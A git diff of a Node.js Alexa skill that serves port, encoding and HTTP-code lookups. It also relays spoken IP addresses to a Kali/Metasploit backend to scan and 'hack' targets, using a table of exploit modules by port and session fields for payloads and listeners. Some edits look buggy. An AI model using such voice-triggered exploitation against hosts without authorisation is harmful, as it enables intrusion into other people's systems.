@@ -15,15 +15,23 @@
 // This really needs to be rewritten in Python
 // A) because I hate the call-back suckishness of early Node
 // B) because Python supports synch and asynch web calls which is handy 
-// C) because Python rocks
-// D) because this was my second Alexa skill and I was in a hurry to get it coded up
-const APP_ID = "amzn1.ask.skill.blah.blah.blah.blah"; // TODO replace with your app ID if customizing your own copy!
+// C) because Python rocks and the whole project could eventually be one language vs 3
+// D) because my Node syntax is sloppy as you'll see
+// that said: I try to keep objects or obj references or char references using single quote, strings using double
+// if you see me break that rule please feel free to fix it.
+
+//I wonder if this will stop SQS events?
+const APP_ID = "amzn1.ask.skill.dd150dc5-6d00-418e-8e91-6e105a4c1fce"; // TODO replace with your app ID if customizing your own copy.
+
+
 const Alexa = require('alexa-sdk');
+
 //const request = require('sync-request');
-//const awsSDK = require('aws-sdk');
+const awsSDK = require('aws-sdk');
 const https = require('https');
 //var Data = require("./data");
 var crypto = require('crypto');
+//var fetch = require('node-fetch'); 
 
 // the following typically looks like: "exploit/osx/mdns/upnp_location" : "0", // but pymetasploit uses just the part after the exploit/
 const exploitports = { "EXPLOITPORTS_EN_US":{
@@ -974,8 +982,8 @@ const exploitports = { "EXPLOITPORTS_EN_US":{
 "windows/vpn/safenet_ike_11" : "62514",
 "windows/misc/landesk_aolnsrvr" : "65535"}
 };
+// well known and some common ports
 const ports = { "PORTS_EN_US" : {
-    // well known ports
 	"0" : "Port 0 is reserved, but if in use by an API it may return a dynamically allocated port.",
 	"1" : "Port 1 is TCP and UDP are reserved for Port Service Multiplexer or TCP MUX",
 	"2" : "Port 2 is unknown.",
@@ -1228,7 +1236,18 @@ const ports = { "PORTS_EN_US" : {
 	"1025" : "Port 1025 TCP is reserved.",
 	"1027" : "Port 1027 UDP is Native IP-v6 behind IP-v4-to-IP-v4 NAT.",
 	"1028" : "Port 1028 is deprecated.",
+	"1433" : "Port 1433 is SQL Server",
+	"2149" : "Port 2149 may be N F S.",
+	"2121" : "Port 2121 may be a FTP server or Scientia SSDB",
 	"2949" : "Port is WAP push secure multimedia messaging service.",
+	"3306" : "Port 3306 is typically My SQL.",
+	"5432" : "Port 5432 is post gress",
+	"6000" : "Port 6000 is X eleven.",
+	"6667" : "Port 6667 is typically IRC.",
+	"8000" : "Port 8000 may be icecast",
+	"8080" : "Port 8080 is often used for web proxies. It is a common port for Glassfish",
+	"8009" : "Port 8009 may be Apache J serve protocol",
+	"8180" : "Port 8180 may be Apache Tomcat or EMC2 Legato.",
 	"9001" : "Port 9001 TCP is used for Share Point, or Cisco router configuration, or Tor, or DBG proxy, or H SQL DB, and port 9001 TCP and UDP is used by ETL Service Manager",
 	"9150" : "Port 9150 is Tor.",
 	"11001" : "Port 11 001 TCP and UDP is used by meta sys or Johnson Controls Metasys java AC controls",
@@ -1822,7 +1841,7 @@ const htmlencodings = {   "HTML_EN_US" : {
         "back space": { "speech": "ampersand pound 8 semi-colon", "card" : "&#8;"},
         "tab": { "speech": "ampersand pound 9 semi-colon", "card" : "&#9;"},
         "line feed": { "speech": "ampersand pound 10 semi-colon", "card" : "&#10;"},
-	    "enter": { "speech": "ampersand pound 10 semi-colon", "card" : "&#10;"},
+	    			"enter": { "speech": "ampersand pound 10 semi-colon", "card" : "&#10;"},
         "vertical tab": { "speech": "ampersand pound 11 semi-colon", "card" : "&#11;"},
         "form feed": { "speech": "ampersand pound 12 semi-colon", "card" : "&#12;"},
         "carriage return": { "speech": "ampersand pound 13 semi-colon", "card" : "&#13;"},
@@ -1896,7 +1915,7 @@ const htmlencodings = {   "HTML_EN_US" : {
         "capital x": { "speech": "ampersand pound 88 semi-colon", "card" : "&#88;"},
         "capital y": { "speech": "ampersand pound 89 semi-colon", "card" : "&#89;"},
         "capital z": { "speech": "ampersand pound 90 semi-colon", "card" : "&#90;"},
-	    "upper case a": { "speech": "ampersand pound 65 semi-colon", "card" : "&#65;"},
+	    			"upper case a": { "speech": "ampersand pound 65 semi-colon", "card" : "&#65;"},
         "upper case b": { "speech": "ampersand pound 66 semi-colon", "card" : "&#66;"},
         "upper case c": { "speech": "ampersand pound 67 semi-colon", "card" : "&#67;"},
         "upper case d": { "speech": "ampersand pound 68 semi-colon", "card" : "&#68;"},
@@ -1924,7 +1943,7 @@ const htmlencodings = {   "HTML_EN_US" : {
         "upper case z": { "speech": "ampersand pound 90 semi-colon", "card" : "&#90;"},
         "left square bracket": { "speech": "ampersand pound 91 semi-colon", "card" : "&#91;"},
         "slash": { "speech": "ampersand pound 92 semi-colon", "card" : "&#92;"},
-	    "back slash": { "speech": "ampersand pound 92 semi-colon", "card" : "&#92;"},
+	    			"back slash": { "speech": "ampersand pound 92 semi-colon", "card" : "&#92;"},
         "right square bracket": { "speech": "ampersand pound 93 semi-colon", "card" : "&#93;"},
         "carret": { "speech": "ampersand pound 94 semi-colon", "card" : "&#94;"},
         "underscore": { "speech": "ampersand pound 95 semi-colon", "card" : "&#95;"},
@@ -1960,7 +1979,7 @@ const htmlencodings = {   "HTML_EN_US" : {
         "right curly brace": { "speech": "ampersand pound 125 semi-colon", "card" : "&#125;"},
         "squiggle": { "speech": "ampersand pound 126 semi-colon", "card" : "&#126;"},
         "empty": { "speech": "ampersand pound 127 semi-colon", "card" : "&#127;"},
-	    "delete": { "speech": "ampersand pound 127 semi-colon", "card" : "&#127;"},
+	    			"delete": { "speech": "ampersand pound 127 semi-colon", "card" : "&#127;"},
         "euro": { "speech": "ampersand pound 128 semi-colon, or ampersand e u r o semi-colon", "card" : "&#128; or &euro;"},
         "blank": { "speech": "ampersand pound 129 semi-colon", "card" : "&#129;"},
         "quote comma": { "speech": "ampersand pound 130 semi-colon, or ampersand s b q u o semi-colon", "card" : "&#130; or &sbquo;"},
@@ -1982,7 +2001,7 @@ const charencodings = {   "CHAR_EN_US" : {
         "backspace": { "speech": "", "card" : "8"},
         "tab": { "speech": "", "card" : "9"},
         "line feed": { "speech": "", "card" : "10"},
-	    "enter": { "speech": "", "card" : "10"},
+	    			"enter": { "speech": "", "card" : "10"},
         "vertical tab": { "speech": "", "card" : "11"},
         "form feed": { "speech": "", "card" : "12"},
         "carriage return": { "speech": "", "card" : "13"},
@@ -2057,7 +2076,7 @@ const charencodings = {   "CHAR_EN_US" : {
         "capital x": { "speech": "", "card" : "88"},
         "capital y": { "speech": "", "card" : "89"},
         "capital z": { "speech": "", "card" : "90"},
-	    "upper case a": { "speech": "", "card" : "65"},
+	    			"upper case a": { "speech": "", "card" : "65"},
         "upper case b": { "speech": "", "card" : "66"},
         "upper case c": { "speech": "", "card" : "67"},
         "upper case d": { "speech": "", "card" : "68"},
@@ -2122,7 +2141,7 @@ const charencodings = {   "CHAR_EN_US" : {
         "right curly brace": { "speech": "", "card" : "125"},
         "squiggle": { "speech": "", "card" : "126"},
         "empty": { "speech": "", "card" : "127"},
-	    "delete": { "speech": "", "card" : "127"},
+	    			"delete": { "speech": "", "card" : "127"},
         "euro": { "speech": "", "card" : "128"},
         "blank": { "speech": "", "card" : "129"},
         "quote comma": { "speech": "", "card" : "130"},
@@ -2138,7 +2157,7 @@ const charencodings = {   "CHAR_EN_US" : {
 }};
 	
 const responsecodes = {   "RESPONSECODES_EN_US" : {
- 	"100": "100 or Continue, tells the client that it should finish sending the next portion of the request.",
+ "100": "100 or Continue, tells the client that it should finish sending the next portion of the request.",
 	"101": "101 Switching Protocols means that the server had a positive response to the request and is initiating a new protocol other than HTTP with the Upgrade header.",
 	"200": "200 OK. The OK response indicates success. GET returns the resource in the response, POST returns an entity describig the results of the post.",
 	"201": "201 Created indicates that the request was received and processed and resulted in the creation of a resource.",
@@ -2193,7 +2212,7 @@ const responsecodes = {   "RESPONSECODES_EN_US" : {
 // bool = fuzzysearch(b,a,4));
 
 function doessubofsubexist(m,s,nchars){
-  console.log('>>in standard search');
+  console.log(">>in standard search");
   var i=0; m=m.toLowerCase(); 
   var brez=false; // left to right
   while ((nchars <= m.length-i) && (brez==false)) {brez=s.includes(m.substring(0,m.length-i)); i++;} 
@@ -2224,13 +2243,13 @@ function doesextractofsubexist(m,s,nchars){
 function fuzzysearch(b,a,nchars)
 {
   if (nchars >= b.length) return false;  // if they are trying to match 3 or less chars kick it back.
-  console.log(']in search wrapper');
-  if (doessubofsubexist(b,a,nchars) == true) {console.log(']blue pill worked'); return true;}
+  console.log(">in search wrapper");
+  if (doessubofsubexist(b,a,nchars) == true) {console.log(">blue pill worked"); return true;}
   else if
-   (doesextractofsubexist(b,a,nchars) == true) {console.log(']had to take the red pill'); return true;}
+   (doesextractofsubexist(b,a,nchars) == true) {console.log(">had to take the red pill"); return true;}
   else
     {
-      console.log(']Neither pill worked'); 
+      console.log(">Neither pill worked<"); 
       return false;
     }
 }
@@ -2247,11 +2266,11 @@ function fuzzysearch(b,a,nchars)
         console.log ("sendAlexa2KaliRequest host=" + hoststr);
         var body = "";
      https.get(hoststr, (res) => {
-        console.log('sendAlexa2KaliRequest statusCode:', res.statusCode);
-        console.log('sendAlexa2KaliRequest headers:', res.headers);
+        console.log("sendAlexa2KaliRequest statusCode:", res.statusCode);
+        console.log("sendAlexa2KaliRequest headers:", res.headers);
         res.on('data', (d) => {
         	body += d;
-            console.log(d);
+            //console.log(d);
             });
             // should fire when request is done
              res.on('end', function () {
@@ -2288,29 +2307,38 @@ function fuzzysearch(b,a,nchars)
     
 const handlers = {
  
+'Records': function() { 
+	
+	console.log("Got a QUEUE message");
+ console.log("THIS.EVENT = " + JSON.stringify(this.event));
+ 
+},
+
     'Unhandled': function () {
         console.log("Unhandled Exception for APP: " + APP_ID);
         //console.log("Intent" + this.event.request.intent);
         //console.log("Slots:" + this.event.request.intent.slots);
-        var speechOutput = "I ran into an unhandeled error"; // this.t('UNHANDLED_SPEECH');
+        var speechOutput = "Something didn't quite work properly."; // this.t('UNHANDLED_SPEECH');
         console.log("THIS.EVENT = " + JSON.stringify(this.event));
-        this.emit(':tell', speechOutput);
+        this.attributes.repromptSpeech = "Try again, or ask me something else.";
+        this.emit(":ask", speechOutput,this.attributes.repromptSpeech);
     },
     
     'NewSession': function () {
-        console.log("-NewSession");
+    	if (this.attributes.repromptSpeech === "") this.attributes.repromptSpeech = "hmm";
+       console.log("-NewSession");
        // console.log("APP_ID="+ APP_ID);
        console.log("THIS.EVENT = " + JSON.stringify(this.event));
        // console.log("Slots: " + this.event.request.intent.slots);
-		var randomN = getRandomInt(0,6);
-		var welcomeMessage="Random Number is ";
-		if (randomN === 0) {welcomeMessage = this.t('WELCOME_MESSAGE0')} 
-			else if (randomN === 1) {welcomeMessage = this.t('WELCOME_MESSAGE1')} 
-			else if (randomN === 2) {welcomeMessage=this.t('WELCOME_MESSAGE2')}
-			else if (randomN === 3) {welcomeMessage=this.t('WELCOME_MESSAGE3')}
-			else if (randomN === 4) {welcomeMessage=this.t('WELCOME_MESSAGE4')}
-			else if (randomN === 5) {welcomeMessage=this.t('WELCOME_MESSAGE5')}
-			else {welcomeMessage=this.t('WELCOME_MESSAGE6')}
+							var randomN = getRandomInt(0,6);
+							var welcomeMessage="Random Number is ";
+							if (randomN === 0) {welcomeMessage = this.t('WELCOME_MESSAGE0')} 
+								else if (randomN === 1) {welcomeMessage = this.t('WELCOME_MESSAGE1')} 
+								else if (randomN === 2) {welcomeMessage=this.t('WELCOME_MESSAGE2')}
+								else if (randomN === 3) {welcomeMessage=this.t('WELCOME_MESSAGE3')}
+								else if (randomN === 4) {welcomeMessage=this.t('WELCOME_MESSAGE4')}
+								else if (randomN === 5) {welcomeMessage=this.t('WELCOME_MESSAGE5')}
+								else {welcomeMessage=this.t('WELCOME_MESSAGE6')}
         //console.log(this.event.request.hasOwnProperty('intent'));
         if (this.event.request.hasOwnProperty('intent') === false)
         {
@@ -2429,7 +2457,7 @@ const handlers = {
                 speechOutput += this.t('HTTPVERBS_NOT_FOUND_WITHOUT_ITEM_NAME');
             }  
             //speechOutput += repromptSpeech;
-            console.log('HTTPVerbsIntent>' + itemName);
+            console.log("HTTPVerbsIntent>" + itemName);
             this.attributes.speechOutput = speechOutput;
                     console.log('HTTPVerbsIntent');this.attributes.repromptSpeech = repromptSpeech;
                
@@ -2567,7 +2595,7 @@ const handlers = {
                 speechOutput += this.t('HTMLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
             }  
             //speechOutput += repromptSpeech;
-            console.log('HTMLEncodingIntent>' + itemName);
+            console.log("HTMLEncodingIntent>" + itemName);
             this.attributes.speechOutput = speechOutput;
             this.attributes.repromptSpeech = repromptSpeech;
                
@@ -2587,34 +2615,37 @@ const handlers = {
     'HexEncodingIntent': function () {
     try
     {
-    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
-        console.log('Made it to HexEncodingIntent');
+    	console.log("Hex Encoding intent - THIS.EVENT = ");
         var itemSlot; 
-        if (this.event.request.intent.slots.CHARItem)  itemSlot = this.event.request.intent.slots.CHARItem;
+        if (this.event.request.intent.slots.CHARItem)  
+        							{itemSlot = this.event.request.intent.slots.CHARItem;}
             else
-                 {itemSlot=""; itemSlot.value = "null";}  // if the user doesn't say a character we must assume they want null (right?)
+               {itemSlot="null"; itemSlot.value = "0";}  // if the user doesn't say a character we must assume they want null (right?)
         
         console.log("itemSlot.value=" + itemSlot.value);
         
-        let itemName = "dunno";  // default to null if the slot has a value that can't be matched
+        let itemName = "null";  // init with default of null knowing it will be replaced
         if (itemSlot && itemSlot.value) {
             itemName = itemSlot.value.toLowerCase();
             itemName = itemName.replace('.', '');
         }      
+        else
+        {itemName = "null";}
+        
         console.log("itemName=" + itemName);       
         const cardTitle = this.t('HEXENCODING_DISPLAY_CARD_TITLE', itemName);
         const myEncodings = this.t('CHARENCODINGS');
         const encoding =  myEncodings[itemName];
-        console.log('encoding=' + encoding);
+        console.log("encoding=" + encoding);
 
             var str = Number(encoding.card).toString(16);
 		    if (str.length <=1)    str = "0" + str;
 		    
-		    encoding.speech = str  + " or 0 x " + str;
-		    encoding.card = str + " or 0x" + str;
+		    		encoding.speech = str  + " or 0 x " + str;
+		    		encoding.card = str + " or 0x" + str;
 
-		console.log("encoding.speech=" + encoding.speech);
-		console.log("encoding.card=" + encoding.card);
+								console.log("encoding.speech=" + encoding.speech);
+								console.log("encoding.card=" + encoding.card);
         if (encoding.speech && encoding.card) {
             this.attributes.speechOutput =  itemName + " is " + encoding.speech;  // sub item speech
             this.attributes.repromptSpeech = this.t('HEXENCODING_REPEAT_MESSAGE');
@@ -2623,12 +2654,10 @@ const handlers = {
             let speechOutput = this.t('HEXENCODING_NOT_FOUND_MESSAGE');
             const repromptSpeech = this.t('HEXENCODING_NOT_FOUND_REPROMPT');
             if (itemName && itemName !== "dunno") {
-                speechOutput += this.t('HEXENCODING_NOT_FOUND_WITH_ITEM_NAME', itemName);
-            } else {
                 speechOutput += this.t('HEXENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
             }  
            // speechOutput += repromptSpeech;
-            console.log('HexEncodingIntent>' + itemName);
+            console.log("HexEncodingIntent>" + itemName);
             this.attributes.speechOutput = speechOutput;
             this.attributes.repromptSpeech = repromptSpeech;
                
@@ -2637,9 +2666,9 @@ const handlers = {
     }
     catch (err)
     {
+    	console.log("HexEncodingIntent>" + err.toString());
         const repromptSpeech = this.t('HEXENCODING_NOT_FOUND_REPROMPT');
         let errOutput = this.t('HEXENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
-        console.log('HexEncodingIntent Exception>');
         this.emit(':ask', errOutput, repromptSpeech);
     }
     },  
@@ -2661,7 +2690,7 @@ const handlers = {
         const encoding =  myEncodings[itemName];
           
         if (encoding) {
-			encoding.speech = encoding.card;
+												encoding.speech = encoding.card;
             this.attributes.speechOutput = itemName + " is " + encoding.speech;  // sub item speech
             this.attributes.repromptSpeech = this.t('ASCIIENCODING_REPEAT_MESSAGE');
             this.emit(':askWithCard', encoding.speech , this.attributes.repromptSpeech, cardTitle, encoding.card);
@@ -2674,7 +2703,7 @@ const handlers = {
                 speechOutput += this.t('ASCIIENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
             }  
             // speechOutput += repromptSpeech;
-            console.log('ASCIIEncodingIntent>' + itemName);
+            console.log("ASCIIEncodingIntent>" + itemName);
             this.attributes.speechOutput = speechOutput;
             this.attributes.repromptSpeech = repromptSpeech;
                
@@ -2685,7 +2714,7 @@ const handlers = {
     {
         const repromptSpeech = this.t('ASCIIENCODING_NOT_FOUND_REPROMPT');
         let errOutput = this.t('ASCIIENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
-        console.log('ASCIIEncodingIntent Exception>');
+        console.log("ASCIIEncodingIntent Exception>");
         this.emit(':ask', errOutput, repromptSpeech);
     }
     }, 	
@@ -2715,10 +2744,10 @@ const handlers = {
         const cardTitle = this.t('URLENCODING_DISPLAY_CARD_TITLE', itemName);
         const myEncodings = this.t('CHARENCODINGS');
         const encoding =  myEncodings[itemName];
-		var e = Number(encoding.card).toString(16);
-		if (e.length <= 1) {e= "0" + e;}
-		encoding.speech = "%" + e; 
-		encoding.card = encoding.speech;
+								var e = Number(encoding.card).toString(16);
+								if (e.length <= 1) {e= "0" + e;}
+								encoding.speech = "%" + e; 
+								encoding.card = encoding.speech;
         if (encoding) {
             this.attributes.speechOutput = itemName + " is URL encoded as " + encoding.speech;  // sub item speech
             this.attributes.repromptSpeech = this.t('URLENCODING_REPEAT_MESSAGE');
@@ -2732,7 +2761,7 @@ const handlers = {
                 speechOutput += this.t('URLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
             }  
             //speechOutput += repromptSpeech;
-            console.log('URLEncodingIntent>' + itemName);
+            console.log("URLEncodingIntent>" + itemName);
             this.attributes.speechOutput = speechOutput;
             this.attributes.repromptSpeech = repromptSpeech;
                
@@ -2743,7 +2772,7 @@ const handlers = {
     {
         const repromptSpeech = this.t('URLENCODING_NOT_FOUND_REPROMPT');
         let errOutput = this.t('URLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
-        console.log('URLEncodingIntent Exception>');
+        console.log("URLEncodingIntent Exception>");
         this.emit(':ask', errOutput, repromptSpeech);
     }
     }, 
@@ -2776,7 +2805,7 @@ const handlers = {
                 speechOutput += this.t('RESPONSECODES_NOT_FOUND_WITHOUT_ITEM_NAME');
             }  
             // speechOutput += repromptSpeech;
-            console.log('HTTPResponseIntent>' + itemName);
+            console.log("HTTPResponseIntent>" + itemName);
             this.attributes.speechOutput = speechOutput;
             this.attributes.repromptSpeech = repromptSpeech;
                
@@ -2806,7 +2835,7 @@ const handlers = {
                 speechOutput += this.t('RICKROLL_NOT_FOUND_WITHOUT_ITEM_NAME');
             }  
             // speechOutput += repromptSpeech;
-            console.log('RickRollIntent>' + rollthisguy);
+            console.log("RickRollIntent>" + rollthisguy);
             this.attributes.speechOutput = speechOutput;
             this.attributes.repromptSpeech = repromptSpeech;
                
@@ -2895,25 +2924,25 @@ const handlers = {
     //function getGeoLoc(ip, callback) 
     function getGeoLoc(ip)
     {
-    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
-    //*    // ** add regex to check valid IP and throw away bad input
-       var hoststr= 'http://freegeoip.net/json/' + ip;
+    				//console.log("THIS.EVENT = " + JSON.stringify(this.event));
+    				//*    // ** add regex to check valid IP and throw away bad input
+    				var hoststr= "http://api.ipstack.com/" + ip + "?access_key=" + process.env.IPStackAccessKey + "&format=1";
         var http=require('http');
-        console.log('about to do HTTP Get>' + ip);
+        console.log("about to do HTTP Get>" + ip);
         
         http.get(hoststr, function(res){
             var dat = '';
-            console.log('<getGeoLocResp status code: >' + res.statusCode);
+            console.log("<getGeoLocResp status code: >" + res.statusCode);
             res.on('data', function (chunk) {
                   dat += chunk;
-                  // console.log('DATAchunk=' + dat);
+                  // console.log("DATAchunk=" + dat);
              });
              res.on('error', function (e) {
-                console.log('HTTP ERROR = ' + e);
+                console.log("HTTP ERROR = " + e);
                 gotoDoneGeoLoc(ip, dat, res.statusCode);
             });
             res.on('end', function () {
-               console.log('GeoLoc function DATA=' + dat);
+               console.log("GeoLoc function DATA=" + dat);
                gotoDoneGeoLoc(ip, dat, res.statusCode);
                
             //return callback(dat);
@@ -2928,24 +2957,24 @@ const handlers = {
       // adding response building code inside the asynch function -- snip
         console.log("IP lookup returns>" + response);
         const cardTitle = me.t('IPLOOKUP_DISPLAY_CARD_TITLE', ip);
-        console.log("status="+status);
+        console.log("status=" + status);
         if (status ===200) 
         {
              var json = JSON.parse(response);
-             var   responsedata ='IP address ' + json.ip + ' is located in ' + json.city + ' ' + json.region_name + ' ' + json.country_name; 
+             var   responsedata ="IP address " + json.ip + " is located in " + json.city + " " + json.region_name + " " + json.country_name; 
              const responsewords = responsedata; 
 
             if (json.city ==="" && json.country_name==="")
             {   // we got an empty response which probably means the IP is unassigned
                 me.attributes.speechOutput = me.t('IPLOOKUP_EMPTY_RESPONSE'); 
                 me.attributes.repromptSpeech = me.t('IPLOOKUP_REPEAT_MESSAGE');
-                me.emit(':askWithCard', me.attributes.speechOutput , me.attributes.repromptSpeech, cardTitle, me.attributes.speechOutput);  
+                me.emit(":askWithCard", me.attributes.speechOutput , me.attributes.repromptSpeech, cardTitle, me.attributes.speechOutput);  
             }
             else
             {   // SUCCESS: we got a good response worth showing
                 me.attributes.speechOutput = responsewords; 
                 me.attributes.repromptSpeech = me.t('IPLOOKUP_REPEAT_MESSAGE');
-                me.emit(':askWithCard', responsewords , me.attributes.repromptSpeech, cardTitle, responsedata);
+                me.emit(":askWithCard", responsewords , me.attributes.repromptSpeech, cardTitle, responsedata);
             }
         } 
         else 
@@ -2965,7 +2994,7 @@ const handlers = {
             me.attributes.speechOutput = speechOutput;
             me.attributes.repromptSpeech = repromptSpeech;
                
-            me.emit(':ask', speechOutput, repromptSpeech);
+            me.emit(":ask", speechOutput, repromptSpeech);
         }
     }
 },
@@ -2999,7 +3028,27 @@ const handlers = {
                         let itemSlot3 = this.event.request.intent.slots.IPItemThree.value;
                         let itemSlot4 = this.event.request.intent.slots.IPItemFour.value;
                         let strIP =  itemSlot1 + '-' + itemSlot2 + '-' + itemSlot3 + '-' + itemSlot4;
-                        console.log("about to ScanRequest with " + strIP);
+                        console.log("Clearing Session & run ScanRequest with " + strIP);
+                        
+                        
+                 // ~~~~ cut to other project 5/8/19
+                        console.log("Tried to clear session data");
+                        				this.attributes['responsetype'] = "0";
+																												this.attributes['rhost'] = "0";
+																		     					this.attributes['windows'] = "0";
+																	        			this.attributes['exploit'] = "0";
+																	        			this.attributes['lhost']  = "0";
+																	        			this.attributes['payload'] = "0";
+																	        			this.attributes['rport']  = "0";
+																	        			this.attributes['lport']  = "0";
+																	        			this.attributes['sessions'] = "0";
+																	        			this.attributes['postmodule'] = "0";
+																	        			this.attributes['error'] = "0";
+																	        			this.attributes['mstatus'] = "No data yet";
+																	        			this.attributes['openports'] = "0";
+																	        			this.attributes['portscanres'] = "0";
+																	        			this.attributes['exploitres'] = "0";
+                       
                         var me = this; // pass context to the callback function
                         sendScanRequest(ip1,ip2,ip3,ip4);
     
@@ -3050,7 +3099,7 @@ const handlers = {
                
             this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
         }
-        
+								
     function sendScanRequest(ip1,ip2,ip3,ip4)
     {
         console.log("About to do the crypto hash for scan request");
@@ -3077,7 +3126,6 @@ const handlers = {
                 console.log(e);
             //    gotoDoneScanRequest(ip,600);  // something bad happened let's call it status 600
         });
-        
       // gotoDoneScanRequest(ip,res.statusCode); // something good happened we don't need to wait around 
     }
             
@@ -3087,7 +3135,7 @@ const handlers = {
         console.log("DoneScanRequest status=" + status);
         if (status ===200) 
         {
-             var   responsedata = me.t('IPSCAN_HACK_STARTED'); //"The hack is on the way."; 
+             var responsedata = me.t('IPSCAN_HACK_STARTED'); //"The hack is on the way."; 
                 me.attributes.speechOutput = responsedata; 
                 me.attributes.repromptSpeech = me.t('IPSCAN_REPEAT_MESSAGE');
                 me.emit(':askWithCard', me.attributes.speechOutput , me.attributes.repromptSpeech, cardTitle, me.attributes.speechOutput);  
@@ -3113,6 +3161,33 @@ const handlers = {
         }
     }
 },
+
+			'ClearSessionData': function (){
+				                console.log("Got command to clear session data");
+                    this.attributes['responsetype'] = "0";
+																				this.attributes['rhost'] = "0";
+																		  this.attributes['windows'] = "0";
+																	   this.attributes['exploit'] = "0";
+																	   this.attributes['lhost']  = "0";
+																	   this.attributes['payload'] = "0";
+																	   this.attributes['rport']  = "0";
+																	   this.attributes['lport']  = "0";
+																	   this.attributes['sessions'] = "0";
+																	   this.attributes['postmodule'] = "0";
+																	   this.attributes['error'] = "0";
+																	   this.attributes['mstatus'] = "No data yet";
+																	   this.attributes['openports'] = "0";
+																	   this.attributes['portscanres'] = "0";
+																	   this.attributes['exploitres'] = "0";
+																	    
+																	    this.attributes['IPItemThree'] = "0";
+																	    this.attributes['IPItemFour'] = "0";
+																	    this.attributes['attribname'] = "empty";
+																	    this.attributes['attribvalue'] = "empty";
+															//delete this.attributes['STATE'];
+															this.emit(':saveState', true);
+			},
+
 
 // IPHackIntent actually do a full round-trip hack on the target from port scanning to exploiting -------------------
    'IPHackIntent': function (){
@@ -3156,6 +3231,25 @@ const handlers = {
                         let itemSlot4 = this.event.request.intent.slots.IPItemFour.value;
                         let strIP =  itemSlot1 + '-' + itemSlot2 + '-' + itemSlot3 + '-' + itemSlot4;
                         console.log("about to ScanRequest with " + strIP);
+                        // clear the vars
+                        // ~~~~ cut to other project 5/8/19
+                        console.log("Tried to clear session data");
+                        				this.attributes['responsetype'] = "0";
+																												this.attributes['rhost'] = "0";
+																		     					this.attributes['windows'] = "0";
+																	        			this.attributes['exploit'] = "0";
+																	        			this.attributes['lhost']  = "0";
+																	        			this.attributes['payload'] = "0";
+																	        			this.attributes['rport']  = "0";
+																	        			this.attributes['lport']  = "0";
+																	        			this.attributes['sessions'] = "0";
+																	        			this.attributes['postmodule'] = "0";
+																	        			this.attributes['error'] = "0";
+																	        			this.attributes['mstatus'] = "No data yet";
+																	        			this.attributes['openports'] = "0";
+																	        			this.attributes['portscanres'] = "0";
+																	        			this.attributes['exploitres'] = "0";
+                        // prep to pass the session into the callback
                         var me = this; // pass context to the callback function
                         this.attributes['rhost']= ip1 + "." + ip2 + "." + ip3 + "." + ip4;
                         sendHackRequest(ip1,ip2,ip3,ip4);
@@ -3217,17 +3311,12 @@ const handlers = {
         console.log('HackIP headers:', res.headers);
         res.on('data', (d) => {
             console.log(d);
-            //gotoDoneHackRequest(ip,res.statusCode); // something good happened we don't need to wait around
             });
-            // should fire when request is done
              res.on('end', function () {
                gotoDoneHackRequest(ip,res.statusCode); });
-            //
             }).on('error', (e) => {
                 console.log(e);
                 this.emit(':ask', "I ran into a connection error while requesting the hack. See the logs for more information.", "What else can I help with?");
-            //    gotoDoneScanRequest(ip,600);  // something bad happened let's call it status 600
-            //**** call a another Ooops Intent to report the error!
         });
       // gotoDoneScanRequest(ip,res.statusCode); // something good happened we don't need to wait around 
     }
@@ -3235,7 +3324,7 @@ const handlers = {
     {    
         const cardTitle = me.t('IPSCAN_DISPLAY_CARD_TITLE', ip);
         console.log("DoneHackRequest status=" + status);
-        if (status ===200) 
+        if (status ==200) 
         {
                // me.attributes.speechOutput = me.t('IPSCAN_HACK_STARTED'); //"The hack is on the way.";  
                 //me.attributes.repromptSpeech = me.t('IPSCAN_REPEAT_MESSAGE');
@@ -3245,12 +3334,11 @@ const handlers = {
                 me.attributes['saythis'] = "Starting recon on target. Here's a little music to keep you in the hacking mood. ";
 				console.log("about to emit PlaySomethingFun");
 				me.emitWithState("PlaySomethingFunIntent"); // delay until the scan is done
-				console.log("Got back from PlaySomethingFun");
-                me.emitWithState(me.attributes.attribvalue);
+				
+															//////////////// this never happens because emit is final
+															//	console.log("Got back from PlaySomethingFun");
+               // me.emitWithState(me.attributes.attribvalue);
                // me.emit(':askWithCard', me.attributes.speechOutput , me.attributes.repromptSpeech, cardTitle, me.attributes.speechOutput);  
-			// wait until response
-			//setTimeout(getPortsScanned,15000);
-
         } 
         else 
         {   // 404 or other error response code
@@ -3278,20 +3366,18 @@ const handlers = {
 'PlaySomethingFunIntent': function() {
 	var responsecode = "";
 	try{
-		console.log("THIS.EVENT = " + JSON.stringify(this.event) );
-		if (! this.attributes['saythis'] ){ responsecode = " <audio src='https://" + process.env.PlaySomethingFun + "'></audio> ";}
-		else {
-			responsecode = this.attributes['saythis'] + " <audio src='https://" + process.env.PlaySomethingFun + "'></audio> ";
+		console.log("PlaySomething Fun EVENT = " + JSON.stringify(this.event) );
+		responsecode = "Here is some music to keep you in the hacking mood. <audio src='https://" + process.env.PlaySomethingFun + "'></audio>";
+		//	responsecode = this.attributes['saythis'] + " <audio src='https://" + process.env.PlaySomethingFun + "'></audio> ";
 		}
 	//var responsecode="waiting for " + this.attributes['attribname'] + " to complete <audio src='https://" + process.env.RickRollPath + "'></audio> ";
-	} catch(error) {
+	 catch(error) {
 	 console.log("PSFI - No response from Kali yet");
-	 responsecode="there is no update from Kali yet <audio src='https://" + process.env.RickRollPath + "'></audio> ";
+	 responsecode="<speech>I ran into an error in Play something fun</speech><audio src='https://" + process.env.RickRollPath + "'></audio> ";
 	}
 	finally{
-	//this.emit(":ask","Done that now.","Is there anything else you would like me to do?");
-	this.attributes.repromptSpeech = "";  // don't say anything if we're just going to the next function in the state queue
-	this.emit(':ask', responsecode, "If you want to find out about how the hack is going, just say How's the hack going?");
+	this.attributes.repromptSpeech = "What else can I do for you?";  // don't say anything if we're just going to the next function in the state queue
+	this.emit(':ask', responsecode, "If you want to find out about how the hack is going, ask How's the hack going");
 	}
 	//try {
 	//	this.emitWithState(this.attributes['attribvalue']);
@@ -3301,10 +3387,11 @@ const handlers = {
 	//}
 },
 
+
 'exploitres': function() { 
